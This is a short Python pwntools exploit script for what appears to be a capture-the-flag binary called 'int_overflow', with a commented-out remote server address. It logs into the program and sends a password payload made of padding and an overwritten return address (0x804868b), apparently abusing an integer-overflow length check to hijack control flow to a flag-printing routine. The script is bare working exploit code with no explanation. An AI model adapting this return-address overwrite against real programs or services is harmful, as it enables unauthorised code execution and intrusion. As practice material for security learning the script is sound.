from pwn import *
p = process("./int_overflow")
# p = remote("111.198.29.45",48023)
context.log_level = 'debug'
# context.terminal = ['tmux','splitw','-h']

elf = ELF("./int_overflow")
cat_flag = 0x8048960
system = elf.sym['system']
# gdb.attach(p)
str1 = '1'

p.sendlineafter('Login',str1)
str2 = "asdfasdf"
p.sendlineafter('username',str2)
payload = 'a'*(0x14+4) + p32(0x804868b) + 'a'*234

p.sendlineafter('passwd',payload)
p.interactive()
